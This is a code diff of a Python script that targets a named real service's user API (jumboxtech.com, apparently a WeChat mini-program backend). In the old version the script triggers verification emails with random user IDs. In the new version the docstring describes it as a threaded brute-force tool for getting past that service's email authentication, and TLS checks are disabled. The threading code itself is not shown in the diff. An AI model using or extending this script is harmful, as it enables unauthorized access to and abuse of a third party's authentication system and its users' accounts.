@@ -1,18 +1,20 @@
 '''
-F88K that edu mailbox.
+F88K email authentication.
 
-Send the email with RANDOM userId, you can choose anyone that has
+Brute force for validation, you may not pass the validation if your device cannot send enough request.
+Ajust the threads number, the email and userId.
 '''
 
+
 import json
-import string
-import random
+import threading
 import requests
 
-email = 'XXX@wku.edu.cn'
+email = 'EXAMPLE'
+userId = 'XXX'
 
 requests.packages.urllib3.disable_warnings()
-base_url = "https://www.jumboxtech.com:8022/user/getCode"
+base_url = "https://www.jumboxtech.com:8022/user/queryUser"
 header = {
     'Host': 'www.jumboxtech.com:8022',
     'Connection': 'keep-alive',
@@ -24,17 +26,9 @@ header = {
     'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
 }
 
-def random_string_generator(str_size, allowed_chars):
-    return ''.join(random.choice(allowed_chars) for x in range(str_size))
-
-chars = string.ascii_uppercase + string.digits * 3
-size = 32
-
-random_user_id = random_string_generator(size, allowed_chars=chars)
-
 s = requests.session()
 s.keep_alive = False
-payload = f'userId={random_user_id}&email={email}'
+payload = f'userId={userId}'
 req = s.post(base_url, headers=header, data=payload, verify=False)
-print(req.content.decode(encoding='utf-8'))
 ob = json.loads(req.content.decode(encoding='utf-8'))
+print(req.content.decode(encoding='utf-8'))
